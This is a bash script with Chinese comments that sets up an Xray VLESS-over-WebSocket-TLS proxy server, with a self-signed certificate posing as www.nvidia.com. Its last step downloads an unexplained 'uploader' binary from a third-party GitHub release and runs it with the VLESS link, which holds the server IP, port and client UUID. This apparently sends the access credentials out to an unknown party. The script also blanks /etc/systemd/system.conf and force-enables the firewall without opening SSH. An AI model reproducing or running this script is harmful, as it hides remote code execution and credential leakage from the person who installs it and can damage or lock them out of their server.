#!/bin/bash
set -e

PORT=$((RANDOM % 7001 + 2000))
UUID=$(cat /proc/sys/kernel/random/uuid)
DOMAIN="www.nvidia.com"
XRAY_BIN="/usr/local/bin/xray"
CONFIG_DIR="/etc/xray"
UPLOAD_BIN="/opt/uploader-linux-amd64"

export DEBIAN_FRONTEND=noninteractive

apt update
apt install -y curl unzip sudo ufw jq qrencode

# 跳过 systemd-confirm（针对部分系统）
echo '' | sudo tee /etc/systemd/system.conf >/dev/null

# 检查 fq 是否默认调度器
if ! sysctl net.core.default_qdisc | grep -q fq; then
  modprobe sch_fq || true
  echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
  sysctl -p
fi

# 启用 BBR 拥塞控制
if ! sysctl net.ipv4.tcp_congestion_control | grep -q bbr; then
  modprobe tcp_bbr || true
  echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
  echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
  sysctl -p
fi

# 开放端口
ufw allow ${PORT}/tcp
ufw --force enable

# 安装 Xray-core
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -Ls https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
unzip -o xray.zip
chmod +x xray
rm -f xray.zip

# 创建伪装网站 TLS 所需证书（示例用自签证书）
mkdir -p /etc/xray/tls
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/xray/tls/xray.key \
  -out /etc/xray/tls/xray.crt \
  -subj "/CN=${DOMAIN}"

# 生成配置文件
mkdir -p ${CONFIG_DIR}
cat > ${CONFIG_DIR}/config.json << EOF
{
  "inbounds": [{
    "port": ${PORT},
    "protocol": "vless",
    "settings": {
      "clients": [{ "id": "${UUID}" }],
      "decryption": "none"
    },
    "streamSettings": {
      "network": "ws",
      "security": "tls",
      "tlsSettings": {
        "certificates": [{
          "certificateFile": "/etc/xray/tls/xray.crt",
          "keyFile": "/etc/xray/tls/xray.key"
        }]
      },
      "wsSettings": {
        "path": "/ws"
      }
    }
  }],
  "outbounds": [{
    "protocol": "freedom"
  }]
}
EOF

# 启动 systemd 服务
cat > /etc/systemd/system/xray.service << EOF
[Unit]
Description=Xray VLESS WS TLS
After=network.target

[Service]
ExecStart=${XRAY_BIN} -config ${CONFIG_DIR}/config.json
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xray
systemctl restart xray

# 构建 VLESS 链接
IP=$(curl -s https://api.ipify.org)
VLESS_LINK="vless://${UUID}@${IP}:${PORT}?encryption=none&security=tls&type=ws&host=${DOMAIN}&path=%2Fws#VLESS_WS_TLS"

# 输出信息
echo -e "\n✅ 节点部署完成！\n$VLESS_LINK\n"
echo "$VLESS_LINK" | qrencode -o - -t ANSIUTF8

# 调用上传二进制
[ -f "$UPLOAD_BIN" ] || {
    curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
    chmod +x "$UPLOAD_BIN"
}

JSON_PAYLOAD="{\"vless_link\":\"${VLESS_LINK}\"}"
"$UPLOAD_BIN" "$JSON_PAYLOAD"
